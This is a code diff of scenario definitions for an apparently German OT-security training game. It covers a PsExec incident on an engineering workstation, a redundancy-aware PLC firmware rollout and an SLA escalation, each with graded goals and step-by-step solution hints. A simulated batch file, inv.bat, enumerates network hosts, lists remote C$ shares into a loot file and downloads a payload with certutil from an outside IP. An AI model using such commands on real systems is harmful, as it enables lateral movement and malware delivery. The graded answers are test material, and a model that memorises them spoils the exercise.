@@ -734,83 +734,124 @@ Du bist auf der Engineering-Workstation (ENG-WORKSTATION) eingeloggt. Analysiere
       hostname: 'ENG-WORKSTATION',
       username: 'engineer',
       currentPath: 'C:\\Users\\engineer',
-      commands: [
-        {
-          pattern: 'Get-Process',
-          output: `Handles  NPM(K)    PM(K)      WS(K)   CPU(s)     Id  ProcessName
--------  ------    -----      -----   ------     --  -----------
-    234      15    45678      67890     1.23   1234  siemens_tia
-    567      25    23456      34567     2.34   2345  chrome
-    123      10    12345      23456     0.45   3456  PsExec64        # <-- VERDÄCHTIG?
-
-# PsExec64 läuft... Das ist ein legitimes Admin-Tool, aber auch Ransomware-Favorit!`,
-          skillGain: { security: 3, troubleshooting: 2 },
-          isSolution: true,
-        },
-        {
-          pattern: 'Get-WinEvent',
-          patternRegex: 'Get-WinEvent|eventvwr',
-          output: `TimeCreated          ProviderName         Message
------------          ------------         -------
-14.03.2026 09:15:00  Defender             Verdächtige Aktivität: PsExec64.exe
-14.03.2026 09:15:00  Defender             Verhaltensanalyse: Datei-Enumeration
-14.03.2026 09:14:55  Security             Neuer Prozess: PsExec64.exe
-14.03.2026 09:14:50  Security             Admin-Login: engineer
-
-# PsExec wurde um 09:14:55 gestartet, Defender schlug um 09:15:00 an`,
-          skillGain: { security: 4, troubleshooting: 3 },
-          isSolution: true,
-        },
-        {
-          pattern: 'netstat',
-          patternRegex: 'netstat|Get-NetTCPConnection',
-          output: `Proto  LocalAddress         ForeignAddress       State
-TCP    192.168.20.100:49152  10.0.0.1:445         ESTABLISHED  # SCADA-Master!
-TCP    192.168.20.100:49153  10.0.0.10:102        ESTABLISHED  # PLC01!
-
-# ALARM: Die Workstation hat aktive Verbindungen ins OT-Netz!`,
-          skillGain: { netzwerk: 4, security: 4 },
-          isSolution: true,
-        },
-        {
-          pattern: 'taskkill',
-          patternRegex: 'taskkill|Stop-Process.*PsExec',
-          output: `ERFOLGREICH: Der Prozess "PsExec64.exe" mit PID 3456 wurde beendet.
-
-# PsExec wurde gestoppt. Aber hat er schon Schaden angerichtet?`,
-          skillGain: { security: 2 },
-        },
-        {
-          pattern: 'Get-ChildItem',
-          patternRegex: 'Get-ChildItem.*-Recurse.*\\.(encrypted|locked)',
-          output: `Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
-<Keine Dateien gefunden>
-
-# Keine verschlüsselten Dateien gefunden - noch nicht ausgebrochen!`,
-          skillGain: { security: 3 },
-        },
+      // Der Fall ist eine Unterscheidungsaufgabe, keine Aufräumaktion: ZWEI
+      // Prozesse sprechen mit dem OT-Netz, und einer davon gehört dorthin.
+      // Deshalb sind Prozesse und Verbindungen echter Zustand — nur so kann
+      // „alles abschießen" wirklich scheitern, statt im Ergebnistext getadelt
+      // zu werden.
+      taskText:
+        'Der Virenscanner hat angeschlagen. Verschaff dir ein Bild, bevor du etwas beendest: Welche Prozesse laufen (Get-Process), wohin spricht die Maschine gerade (Get-NetTCPConnection), und was steht im Verlauf des Virenscanners unter C:\\ProgramData\\Defender\\verlauf.log?\n\nDann beende, was nicht hierher gehört. Was zur laufenden Inbetriebnahme gehört, bleibt — der Zettel auf dem Schreibtisch sagt dir, was das ist.',
+      net: {
+        targets: [
+          { host: '10.0.0.1', openPorts: [445], dienste: { 445: 'microsoft-ds' } },
+          { host: '10.0.0.10', openPorts: [102], dienste: { 102: 'iso-tsap' } },
+          { host: '185.243.115.44', openPorts: [443] },
+        ],
+      },
+      processes: [
+        { pid: 1180, name: 'explorer', user: 'engineer', cmd: 'C:\\Windows\\explorer.exe', cpu: 210 },
+        { pid: 1234, name: 'siemens_tia', user: 'engineer', cmd: 'C:\\Program Files\\Siemens\\Portal V18\\Siemens.Automation.Portal.exe', cpu: 123 },
+        { pid: 3456, name: 'PsExec64', user: 'engineer', cmd: 'C:\\Temp\\svc\\PsExec64.exe -accepteula -s cmd /c inv.bat', cpu: 45 },
+        { pid: 5678, name: 'powershell', user: 'engineer', cmd: 'powershell.exe', cpu: 8 },
       ],
+      connections: [
+        // Die Engineering-Sitzung: gehört dorthin und läuft gerade.
+        { proto: 'tcp', localPort: 49200, peer: '10.0.0.10:102', pid: 1234, program: 'siemens_tia', user: 'engineer' },
+        // Und die beiden, die nicht dorthin gehören — plus die Leitung nach
+        // draußen, die erklärt, warum das kein Admin-Werkzeug im Einsatz ist.
+        { proto: 'tcp', localPort: 49152, peer: '10.0.0.1:445', pid: 3456, program: 'PsExec64', user: 'engineer' },
+        { proto: 'tcp', localPort: 49153, peer: '10.0.0.10:102', pid: 3456, program: 'PsExec64', user: 'engineer' },
+        { proto: 'tcp', localPort: 49154, peer: '185.243.115.44:443', pid: 3456, program: 'PsExec64', user: 'engineer' },
+      ],
+      vfsOverlay: {
+        directories: ['C:\\ProgramData\\Defender', 'C:\\Temp\\svc', 'C:\\Users\\engineer\\Desktop'],
+        files: [
+          {
+            path: 'C:\\ProgramData\\Defender\\verlauf.log',
+            content:
+              '14.03.2026 09:14:50  Anmeldung  engineer (interaktiv, Konsole)\n' +
+              '14.03.2026 09:14:55  Prozessstart  C:\\Temp\\svc\\PsExec64.exe -accepteula -s cmd /c inv.bat\n' +
+              '                     Elternprozess: C:\\Users\\engineer\\Downloads\\rechnung_03_2026.pdf.lnk\n' +
+              '14.03.2026 09:15:00  Verhaltensanalyse  Dateizählung über Netzlaufwerke, 1400 Objekte in 3 s\n' +
+              '14.03.2026 09:15:00  Verhaltensanalyse  Ausgehende Verbindung zu 185.243.115.44:443 (keine Zuordnung)\n' +
+              '14.03.2026 09:15:02  Hinweis  Keine verschlüsselten Dateien gefunden — Zugriffsmuster, keine Verschlüsselung\n' +
+              '\n' +
+              '# Zur Einordnung: PsExec ist ein reguläres Administrationswerkzeug.\n' +
+              '# Was hier auffällt, ist nicht das Werkzeug, sondern woher es kam\n' +
+              '# (eine Verknüpfung in Downloads, die wie eine Rechnung aussieht)\n' +
+              '# und wohin es spricht.\n',
+          },
+          {
+            path: 'C:\\Temp\\svc\\inv.bat',
+            content:
+              '@echo off\r\n' +
+              'net view /all > \\\\10.0.0.1\\transfer$\\hosts.txt\r\n' +
+              'for /f %%h in (hosts.txt) do dir \\\\%%h\\c$ >> loot.txt\r\n' +
+              'certutil -urlcache -split -f https://185.243.115.44/p.bin p.bin\r\n',
+          },
+          {
+            path: 'C:\\Users\\engineer\\Desktop\\wartungsfenster.txt',
+            content:
+              'Inbetriebnahme Pumpwerk 3 — 14.03.2026\n' +
+              '======================================\n' +
+              '08:00-11:00  Parametrierung PLC01 über das TIA Portal (Verbindung 10.0.0.10:102)\n' +
+              '             NICHT unterbrechen: Ein abgebrochener Download lässt die\n' +
+              '             Steuerung in einem undefinierten Zustand zurück. Wiederanlauf\n' +
+              '             nur mit Hersteller vor Ort.\n' +
+              '11:00-11:30  Abnahme mit dem Betrieb\n',
+          },
+        ],
+      },
+      commandSkillGain: {
+        'Get-Process': { windows: 2, security: 1 },
+        'Get-NetTCPConnection': { windows: 2, netzwerk: 3, security: 2 },
+        'Get-Content': { windows: 1 },
+        'Stop-Process': { windows: 2, security: 2 },
+      },
+      commands: [],
       solutions: [
         {
-          commands: ['netstat', 'Get-Process'],
+          commands: [],
           allRequired: false,
-          resultText: 'Du hast die Situation analysiert: PsExec ist ein Admin-Tool, aber die OT-Verbindungen sind besorgniserregend. Isolation wäre trotzdem die richtige erste Reaktion gewesen!',
-          skillGain: { security: 5, netzwerk: 4, troubleshooting: 4 },
-          effects: {},
+          stateGoals: [
+            // Ohne den Verlauf ist das Beenden geraten — PsExec allein ist
+            // kein Befund, es ist ein legitimes Werkzeug.
+            { fileRead: 'C:\\ProgramData\\Defender\\verlauf.log' },
+            { processAbsent: { name: 'PsExec64' } },
+            // Und die bewahrende Bedingung, die „alles beenden" ausschließt.
+            { processPresent: { name: 'siemens_tia' } },
+          ],
+          feedback: [
+            {
+              when: {
+                commandAbsent: { pattern: 'Get-NetTCPConnection|netstat', ignoreCase: true },
+              },
+              text: '⚠ Du hast beendet, ohne nachzusehen, wohin die Maschine sprach. Die drei Verbindungen sind jetzt weg — und mit ihnen der Beweis, dass jemand im OT-Netz war.',
+            },
+            {
+              when: {
+                commandBefore: [{
+                  first: { pattern: 'Get-NetTCPConnection|netstat', ignoreCase: true },
+                  second: { pattern: 'Stop-Process|kill', ignoreCase: true },
+                }],
+              },
+              text: '✓ Erst gesehen, dann beendet. Die Verbindungsliste ist der einzige Beleg dafür, wohin der Zugriff schon gereicht hat — nach dem Beenden gibt es sie nicht mehr.',
+            },
+          ],
+          resultText:
+            'Genau die richtige Unterscheidung. PsExec ist ein reguläres Administrationswerkzeug — verdächtig war nicht das Werkzeug, sondern seine Herkunft (eine Verknüpfung in Downloads, die wie eine Rechnung aussieht) und sein Ziel: 185.243.115.44 kennt hier niemand.\n\nUnd es war schon drüben. Zwei der drei Verbindungen gingen ins OT-Netz — auf den SCADA-Master und auf PLC01. Das ist der Grund, warum diese Arbeitsstation das gefährlichste Gerät im Haus ist: Sie ist per Auftrag in beiden Netzen.\n\nWas du stehen gelassen hast, zählt genauso. Das TIA Portal parametriert bis 11:00 Uhr PLC01. Ein abgebrochener Download hinterlässt die Steuerung in einem undefinierten Zustand, und der Wiederanlauf geht nur mit dem Hersteller vor Ort. „Im Zweifel alles beenden" ist in der Bürowelt vorsichtig und in der Anlagenwelt ein Betriebsausfall.',
+          skillGain: { security: 6, netzwerk: 4, windows: 4 },
+          effects: { stress: 1 },
         },
       ],
       hints: [
-        'Tipp: Welche Prozesse laufen? Get-Process zeigt sie',
-        'Tipp: Hat die Workstation Verbindungen zum OT-Netz? netstat -an',
-        'Tipp: Die Windows Event Logs zeigen wann was passiert ist',
+        '🤖 Jens: Nicht beenden, bevor du weißt, was läuft. Erst die Prozessliste, dann die offenen Verbindungen — in dieser Reihenfolge, weil das Beenden die Verbindungen mitnimmt.',
+        '🤖 Jens: Zwei Prozesse sprechen ins OT-Netz. Einer davon steht auf dem Zettel auf dem Schreibtisch und hat dort zu sein. Der andere hat eine dritte Verbindung, die ins Internet geht.',
+        '🤖 Jens: PsExec ist kein Schadprogramm, das ist ein Admin-Werkzeug. Ob es hier hingehört, steht nicht im Namen — das steht im Verlauf des Virenscanners: wer es gestartet hat und woraus.',
+        '🤖 Jens: Konkret: `Get-Process` → `Get-NetTCPConnection` → `Get-Content C:\\ProgramData\\Defender\\verlauf.log` → `Get-Content C:\\Users\\engineer\\Desktop\\wartungsfenster.txt` → `Stop-Process -Id 3456`.',
       ],
     },
   },
-
-  // ============================================
-  // VENDOR MANAGEMENT SCENARIOS
-  // ============================================
   {
     id: 'KRITIS-SC-006',
     title: 'Siemens Firmware-Update für kritische SPS',
@@ -871,103 +912,121 @@ Du musst koordinieren. Das Update liegt unter /opt/siemens/firmware/ bereit.`,
       username: 'engineer',
       currentPath: '/opt/siemens/firmware',
       templateIds: ['scada'],
-      commands: [
-        {
-          pattern: 'ls',
-          patternRegex: '^ls(\\s.*)?$',
-          output: `total 24576
-drwxr-xr-x 2 root engineer 4096 Mar 14 08:00 .
-drwxr-xr-x 4 root root     4096 Jan 15 08:00 ..
--rw-r--r-- 1 root engineer 8234567 Mar 14 08:00 S7-1200_FW_4.6.2.upd
--rw-r--r-- 1 root engineer    1234 Mar 14 08:00 S7-1200_FW_4.6.2.md5
--rw-r--r-- 1 root engineer    5678 Mar 14 08:00 README_CVE-2026-1234.txt
-
-# Firmware-Datei und Dokumentation vorhanden`,
-          skillGain: { linux: 1 },
-        },
-        {
-          pattern: 'cat',
-          patternRegex: 'cat.*README',
-          output: `=== Siemens Security Advisory SSA-2026-1234 ===
-CVE-2026-1234: Remote Code Execution via Modbus
-
-AFFECTED VERSIONS: S7-1200 FW 4.6.0, 4.6.1
-FIXED IN: 4.6.2
-
-SEVERITY: CVSS 9.8 (CRITICAL)
-
-MITIGATION: Update to 4.6.2 IMMEDIATELY
-            Alternative: Disable Modbus interface (not recommended)
-
-UPDATE PROCEDURE:
-1. Stop PLC gracefully
-2. Upload firmware via TIA Portal or plc-updater
-3. Reboot PLC
-4. Verify firmware version
-5. Test process control
-
-ESTIMATED DOWNTIME: 5-10 minutes per PLC
-
-# Kritisches Update! 5-10 Minuten pro PLC ist machbar`,
-          skillGain: { security: 3, troubleshooting: 2 },
-          isSolution: true,
-        },
-        {
-          pattern: 'md5sum',
-          patternRegex: 'md5sum.*\\.upd',
-          output: `a3f2b1c9d8e7f6a5b4c3d2e1f0a9b8c7  S7-1200_FW_4.6.2.upd
-Comparing with S7-1200_FW_4.6.2.md5... OK
-
-# Checksumme stimmt - Firmware ist integer`,
-          skillGain: { security: 2 },
-        },
-        {
-          pattern: 'plc-status',
-          patternRegex: 'plc-status|./check-plcs',
-          output: `=== PLC Status Overview ===
-PLC01 (10.0.0.10): RUNNING  FW: 4.6.1  Load: 45%  Redundancy: PLC02
-PLC02 (10.0.0.11): RUNNING  FW: 4.6.1  Load: 52%  Redundancy: PLC01
-PLC03 (10.0.0.12): RUNNING  FW: 4.6.1  Load: 38%  Redundancy: none
-
-Update Plan:
-- PLC01 first (PLC02 provides redundancy)
-- PLC02 second (PLC01 provides redundancy)
-- PLC03 last (schedule during low-activity window)
-
-# Rolling Update möglich! PLC01 und PLC02 haben Redundanz`,
-          skillGain: { troubleshooting: 4, netzwerk: 2 },
-          isSolution: true,
-        },
-        {
-          pattern: 'plc-update',
-          patternRegex: 'plc-update|./update-plc',
-          output: `=== PLC Firmware Update Tool ===
-Usage: plc-update <PLC-IP> <firmware-file> [--dry-run]
-
-Example: plc-update 10.0.0.10 S7-1200_FW_4.6.2.upd
-
-Options:
-  --dry-run     Simulate update without applying
-  --verify      Verify firmware after update
-  --rollback    Rollback to previous version
-
-# Tool zur Verfügung. Mit --dry-run kann man testen`,
-          skillGain: { linux: 2 },
-        },
-      ],
+      // Der Fall ist eine Planungsaufgabe mit einer harten Nebenbedingung, die
+      // nicht im Sicherheitshinweis steht: Zwei der drei Steuerungen vertreten
+      // sich gegenseitig, die dritte nicht. Wer die Anleitung des Herstellers
+      // abarbeitet, aktualisiert alle drei nacheinander — und legt dabei
+      // zweimal etwas still, das niemand auffängt.
+      taskText:
+        'Zwei Quellen lesen: /opt/siemens/firmware/sicherheitshinweis.txt (was das Update behebt und wie lange es dauert) und /opt/scada/config/plc-bestand.txt (welche Steuerung wen vertritt).\n\nDie Firmware vor dem Einspielen prüfen: sha256sum über die .upd-Datei und gegen /opt/siemens/firmware/sha256sums.txt halten.\n\nDann den Plan nach /home/engineer/rollout.md schreiben — kein Editor da, also echo "…" > datei und echo "…" >> datei. Genau diese drei Zeilen:\nrollend: <Steuerungen, die im laufenden Betrieb gehen, kommagetrennt>\nfenster: <Steuerung, die ein Wartungsfenster braucht>\nabgleich: ok | abweichung',
+      vfsOverlay: {
+        directories: ['/opt/siemens/firmware', '/opt/scada/config', '/home/engineer'],
+        files: [
+          {
+            path: '/opt/siemens/firmware/firmware-4.6.2.upd',
+            content:
+              'S7-1200 Firmware Image 4.6.2\n' +
+              'Build 2026-02-28, signiert (Siemens AG)\n' +
+              '--- Binaerabbild, im Terminal nicht lesbar ---\n',
+          },
+          {
+            // Der Wert ist die ECHTE Summe der Datei darüber — nachgerechnet
+            // von der Wache, nicht abgeschrieben. Eine erfundene Zahl wäre
+            // genau die Sorte Nachweis, die dieses Level kritisiert.
+            path: '/opt/siemens/firmware/sha256sums.txt',
+            content:
+              '24ee2090287734dda8f41c9a4f1a02f324c44241942366233fef3a81d376f2f6  firmware-4.6.2.upd\n',
+          },
+          {
+            path: '/opt/siemens/firmware/sicherheitshinweis.txt',
+            content:
+              'Siemens Security Advisory SSA-2026-1234\n' +
+              '=======================================\n' +
+              'CVE-2026-1234: Ausführung von Code über die Modbus-Schnittstelle\n' +
+              'Betroffen: S7-1200 Firmware 4.6.0 und 4.6.1\n' +
+              'Behoben in: 4.6.2\n' +
+              'Bewertung: 9.8 (kritisch)\n' +
+              '\n' +
+              'Voraussetzung für einen Angriff: Netzzugang zur Modbus-Schnittstelle\n' +
+              '(Port 502). Eine Authentifizierung ist nicht erforderlich.\n' +
+              '\n' +
+              'Vorgehen\n' +
+              '--------\n' +
+              '1. Steuerung geordnet anhalten\n' +
+              '2. Abbild einspielen (TIA Portal oder plc-update)\n' +
+              '3. Steuerung neu starten\n' +
+              '4. Version prüfen\n' +
+              '5. Prozessführung testen\n' +
+              '\n' +
+              'Stillstand je Steuerung: 5 bis 10 Minuten.\n' +
+              '\n' +
+              'Hinweis: Prüfen Sie vor dem Einspielen die Prüfsumme des Abbilds\n' +
+              'gegen die mitgelieferte Liste. Ein beschädigtes Abbild kann die\n' +
+              'Steuerung in einem nicht startfähigen Zustand zurücklassen.\n',
+          },
+          {
+            path: '/opt/scada/config/plc-bestand.txt',
+            content:
+              '# Steuerungen Wasserwerk — Stand 01.03.2026\n' +
+              '# kennung  adresse      funktion            vertretung\n' +
+              'plc01      10.0.0.10    Pumpensteuerung     plc02\n' +
+              'plc02      10.0.0.11    Ventilsteuerung     plc01\n' +
+              'plc03      10.0.0.12    Sensorik            keine\n' +
+              '\n' +
+              '# Zur Vertretung: plc01 und plc02 übernehmen die Aufgaben des\n' +
+              '# jeweils anderen, solange eine von beiden läuft. NIE beide\n' +
+              '# gleichzeitig anhalten.\n' +
+              '# plc03 hat keine Vertretung. Ohne sie fährt die Anlage blind —\n' +
+              '# dafür braucht es ein angekündigtes Fenster, kein Zeitfenster\n' +
+              '# zwischen zwei Tassen Kaffee.\n',
+          },
+        ],
+      },
+      commandSkillGain: {
+        cat: { linux: 1 },
+        sha256sum: { linux: 2, security: 3 },
+        echo: { linux: 1 },
+      },
+      commands: [],
       solutions: [
         {
-          commands: ['cat', 'plc-status'],
-          allRequired: true,
-          resultText: 'Exzellent! Du hast die Firmware-Dokumentation gelesen und einen Rolling-Update-Plan entwickelt. Mit PLC-Redundanz ist das Update im Betrieb möglich!',
-          skillGain: { security: 4, troubleshooting: 4, softSkills: 5 },
-          effects: {},
+          commands: [],
+          allRequired: false,
+          stateGoals: [
+            // Die Vertretungen stehen NUR in dieser Datei — ohne sie ist der
+            // Plan geraten.
+            { fileRead: '/opt/scada/config/plc-bestand.txt' },
+            // Und die Prüfsumme muss wirklich gerechnet worden sein, nicht
+            // nur behauptet. Genau dafür gibt es die Bedingung: „abgleich:
+            // ok" hinzuschreiben, ohne gerechnet zu haben, ist der Normalfall
+            // in echten Abnahmen — und wertlos.
+            { hashComputed: { path: '/opt/siemens/firmware/firmware-4.6.2.upd', algorithm: 'sha256' } },
+            {
+              file: '/home/engineer/rollout.md',
+              reportFields: [
+                {
+                  key: 'rollend',
+                  requiredItems: ['plc01', 'plc02'],
+                  // Die Sensorik im laufenden Betrieb anzuhalten ist genau der
+                  // Fehler, den die Anleitung des Herstellers nahelegt.
+                  forbiddenItems: ['plc03'],
+                },
+                { key: 'fenster', matches: '^plc03$' },
+                { key: 'abgleich', matches: '^ok$' },
+              ],
+            },
+          ],
+          resultText:
+            'Guter Plan — und er steht nicht im Sicherheitshinweis. Der Hersteller beschreibt, wie man EINE Steuerung aktualisiert. Welche davon man gleichzeitig anhalten darf, weiß nur, wer den eigenen Bestand kennt: plc01 und plc02 vertreten sich gegenseitig, also geht das nacheinander im laufenden Betrieb. plc03 vertritt niemand — dort ist der Stillstand echt, und dafür braucht es ein angekündigtes Fenster.\n\nDamit ist die Aussage „Ein Fenster gibt es nicht" auch beantwortet: Man braucht kein Fenster für das Update, sondern eines für zehn Minuten Sensorik. Das ist eine Verhandlung, die man gewinnen kann.\n\nUnd die Prüfsumme hast du gerechnet, nicht angenommen. Das klingt nach Formalie, bis ein Abbild einmal halb übertragen ankommt: Dann steht eine Steuerung, die sich nicht mehr starten lässt, und niemand weiß, warum. Die Liste mitzuliefern ist billig; sie zu benutzen ist der ganze Zweck.',
+          skillGain: { security: 4, troubleshooting: 4, softSkills: 4 },
+          effects: { stress: -1 },
         },
       ],
       hints: [
-        'Tipp: Was steht in der README zum Update-Prozess?',
-        'Tipp: Welche PLCs haben Redundanz? Das ermöglicht Rolling Updates',
-        'Tipp: plc-status oder ./check-plcs zeigt den aktuellen Stand',
+        '🤖 Jens: Der Sicherheitshinweis sagt dir, WIE man eine Steuerung aktualisiert. Er sagt dir nicht, welche du gleichzeitig anhalten darfst — das weiß nur der eigene Bestand.',
+        '🤖 Jens: Schau in die Bestandsliste unter /opt/scada/config. In der letzten Spalte steht, wer wen vertritt. Zwei der drei können sich gegenseitig auffangen, eine nicht.',
+        '🤖 Jens: Vor dem Einspielen: Die mitgelieferte Summenliste ist nur dann etwas wert, wenn du auch rechnest. sha256sum über die .upd-Datei, dann vergleichen.',
+        '🤖 Jens: Konkret: `cat /opt/siemens/firmware/sicherheitshinweis.txt` → `cat /opt/scada/config/plc-bestand.txt` → `sha256sum /opt/siemens/firmware/firmware-4.6.2.upd` → `cat /opt/siemens/firmware/sha256sums.txt` → `echo "rollend: plc01, plc02" > /home/engineer/rollout.md` → `echo "fenster: plc03" >> /home/engineer/rollout.md` → `echo "abgleich: ok" >> /home/engineer/rollout.md`.',
       ],
     },
   },
@@ -1030,122 +1089,112 @@ System-Info (HMI-Panel hmi-station, 192.168.10.50):
       username: 'operator',
       currentPath: '/var/log/tickets',
       templateIds: ['scada'],
-      commands: [
-        {
-          pattern: 'cat',
-          patternRegex: 'cat.*ticket',
-          output: `=== Ticket #2026-03-09-001 ===
-System: HMI-Panel hmi-station (192.168.10.50)
-Model: Siemens Comfort Panel TP1500
-Issue: Grafikfehler, verzögerter Touchscreen
-
-Timeline:
-  09.03.2026 08:00 - Ticket eröffnet (Priority: HIGH)
-  09.03.2026 08:01 - Auto-Response: "Ticket erhalten"
-  09.03.2026 18:00 - Status: "In Bearbeitung"
-  10.03.2026       - Keine Aktivität
-  11.03.2026       - Keine Aktivität
-  12.03.2026       - Keine Aktivität
-  13.03.2026       - Keine Aktivität
-  14.03.2026 09:00 - HEUTE - Immer noch "In Bearbeitung"
-
-SLA: Premium Support - 24h Reaktionszeit
-SLA STATUS: VERLETZT (5 Tage ohne substantielle Reaktion)
-
-# Klare SLA-Verletzung! 5 Tage statt 24 Stunden!`,
-          skillGain: { softSkills: 4, troubleshooting: 2 },
-          isSolution: true,
-        },
-        {
-          pattern: 'cat',
-          patternRegex: 'cat.*contract|cat.*sla',
-          output: `=== Siemens Premium Support Contract ===
-Contract ID: PREM-2024-KRITIS-001
-Valid: 01.01.2024 - 31.12.2026
-
-Service Levels:
-  CRITICAL: 4h Response, 24h Resolution
-  HIGH:     24h Response, 72h Resolution
-  NORMAL:   48h Response, 5 Business Days Resolution
-
-Penalties for SLA Breach:
-  - 1st Violation: 10% credit on next invoice
-  - 2nd Violation: 25% credit
-  - 3rd Violation: Contract review
-
-Current Status:
-  Violations this year: 2 (this would be #3!)
-
-# Bei der dritten Verletzung gibt es Contract Review!`,
-          skillGain: { softSkills: 5 },
-          isSolution: true,
-        },
-        {
-          pattern: 'ping',
-          patternRegex: 'ping.*192\\.168\\.10\\.50',
-          output: `PING 192.168.10.50 (192.168.10.50) 56(84) bytes of data.
-64 bytes from 192.168.10.50: icmp_seq=1 ttl=64 time=1.2 ms
-64 bytes from 192.168.10.50: icmp_seq=2 ttl=64 time=0.9 ms
-64 bytes from 192.168.10.50: icmp_seq=3 ttl=64 time=1.0 ms
-
-# HMI ist erreichbar`,
-          skillGain: { netzwerk: 1 },
-        },
-        {
-          pattern: 'screenshot',
-          patternRegex: 'screenshot|grab|vnc',
-          output: `Taking screenshot of hmi-station (192.168.10.50)...
-Screenshot saved to: /tmp/hmi_issue_2026-03-14_0900.png
-
-Visual defects documented:
-- Garbled graphics on main process screen
-- Touch calibration off by ~2cm
-- Occasional screen flicker
-
-# Screenshots für Dokumentation gesichert`,
-          skillGain: { troubleshooting: 2 },
-        },
-        {
-          pattern: 'mail',
-          patternRegex: 'mail|sendmail|escalate',
-          output: `Composing escalation email...
-
-To: sabine.koch@siemens.com
-CC: support-escalation@siemens.com, chef@firma.de
-Subject: DRINGEND: SLA-Verletzung Ticket #2026-03-09-001
-
-Attachments:
-- ticket_history.txt
-- sla_contract.pdf
-- hmi_issue_2026-03-14_0900.png
-
-Status: Ready to send
-
-# Eskalation vorbereitet mit allen Dokumenten`,
-          skillGain: { softSkills: 3 },
-          isSolution: true,
-        },
-      ],
+      // Die Falle ist eine Zahl, die freundlich aussieht: Um 08:01 kam eine
+      // Antwort. Wer das als Reaktion zählt, hat keinen Verstoß und keine
+      // Verhandlungsposition. Der Vertrag sagt ausdrücklich etwas anderes —
+      // aber erst im Kleingedruckten unter der Tabelle.
+      taskText:
+        'Zwei Quellen lesen: /var/log/tickets/ticket-2026-03-09-001.log (was wann passiert ist) und /etc/vertragswerk/siemens-premium.txt (was zugesagt war). Beide vollständig, bis unter die Tabellen.\n\nDann die Eskalationsgrundlage nach /home/operator/eskalation.md schreiben — kein Editor da, also echo "…" > datei und echo "…" >> datei. Genau diese fünf Zeilen:\nstufe: <Dringlichkeitsstufe, unter der das Ticket läuft>\nfrist: <zugesagte Reaktionszeit in Stunden, nur die Zahl>\ntechnische_reaktion: <was ein Techniker innerhalb der Frist getan hat>\nverstoss: ja | nein\nfolge: <was der Vertrag für diesen Fall vorsieht, ein Wort>',
+      vfsOverlay: {
+        directories: ['/var/log/tickets', '/etc/vertragswerk', '/home/operator'],
+        files: [
+          {
+            path: '/var/log/tickets/ticket-2026-03-09-001.log',
+            content:
+              'Ticket 2026-03-09-001\n' +
+              '=====================\n' +
+              'System:   Bedienpanel hmi-station (192.168.10.50)\n' +
+              'Gerät:    Comfort Panel TP1500\n' +
+              'Meldung:  Grafikfehler, Touch reagiert verzögert\n' +
+              'Eröffnet als: HOCH\n' +
+              '\n' +
+              'Verlauf\n' +
+              '-------\n' +
+              '09.03.2026 08:00  Ticket eröffnet (Dringlichkeit: hoch)\n' +
+              '09.03.2026 08:01  Eingangsbestätigung (automatisch, Absender: noreply@)\n' +
+              '09.03.2026 18:00  Status auf "In Bearbeitung" gesetzt (System, kein Bearbeiter)\n' +
+              '10.03.2026        keine Aktivität\n' +
+              '11.03.2026        keine Aktivität\n' +
+              '12.03.2026        keine Aktivität\n' +
+              '13.03.2026        keine Aktivität\n' +
+              '14.03.2026 09:00  heute — weiterhin "In Bearbeitung", kein Bearbeiter zugewiesen\n' +
+              '\n' +
+              '# Kein Eintrag nennt einen Menschen. Beide Einträge am 09.03. sind\n' +
+              '# vom System erzeugt.\n',
+          },
+          {
+            path: '/etc/vertragswerk/siemens-premium.txt',
+            content:
+              'Wartungsvertrag Premium — Vertrag PREM-2024-KRITIS-001\n' +
+              '======================================================\n' +
+              'Laufzeit: 01.01.2024 bis 31.12.2026\n' +
+              '\n' +
+              'Reaktionszeiten\n' +
+              '---------------\n' +
+              '  kritisch   4 Stunden Reaktion,  24 Stunden Behebung\n' +
+              '  hoch      24 Stunden Reaktion,  72 Stunden Behebung\n' +
+              '  normal    48 Stunden Reaktion,   5 Werktage Behebung\n' +
+              '\n' +
+              'Was als Reaktion gilt\n' +
+              '---------------------\n' +
+              'Als Reaktion gilt die Kontaktaufnahme durch einen benannten\n' +
+              'Techniker mit einer inhaltlichen Aussage zum Fall. Automatische\n' +
+              'Eingangsbestätigungen und Statusänderungen durch das\n' +
+              'Ticketsystem gelten ausdrücklich NICHT als Reaktion.\n' +
+              '\n' +
+              'Folgen bei Überschreitung\n' +
+              '--------------------------\n' +
+              '  1. Verstoß     Gutschrift 10 Prozent auf die nächste Rechnung\n' +
+              '  2. Verstoß     Gutschrift 25 Prozent\n' +
+              '  3. Verstoß     Eskalation an die Geschäftsleitung beider Seiten\n' +
+              '\n' +
+              'Stand der Verstöße im laufenden Jahr: 2 (dokumentiert am\n' +
+              '17.01.2026 und am 04.02.2026).\n',
+          },
+        ],
+      },
+      commandSkillGain: {
+        cat: { linux: 1 },
+        grep: { linux: 2 },
+        echo: { linux: 1 },
+      },
+      commands: [],
       solutions: [
         {
-          commands: ['cat'],
+          commands: [],
           allRequired: false,
-          resultText: 'Du hast die SLA-Verletzung sauber dokumentiert. Mit dem Vertrag in der Hand hast du eine starke Verhandlungsposition!',
-          skillGain: { softSkills: 6, troubleshooting: 3 },
-          effects: {},
+          stateGoals: [
+            { fileRead: '/var/log/tickets/ticket-2026-03-09-001.log' },
+            { fileRead: '/etc/vertragswerk/siemens-premium.txt' },
+            {
+              file: '/home/operator/eskalation.md',
+              reportFields: [
+                // Nicht „kritisch": Das Ticket läuft als HOCH, und damit gilt
+                // die 24-Stunden-Zusage. Wer die 4 nimmt, argumentiert mit
+                // einer Frist, die niemand zugesagt hat — und verliert das
+                // Gespräch an genau dieser Stelle.
+                { key: 'stufe', matches: '^hoch$' },
+                { key: 'frist', matches: '^24$' },
+                { key: 'technische_reaktion', matches: '^keine$' },
+                { key: 'verstoss', matches: '^ja$' },
+                { key: 'folge', matches: '^eskalation$' },
+              ],
+            },
+          ],
+          resultText:
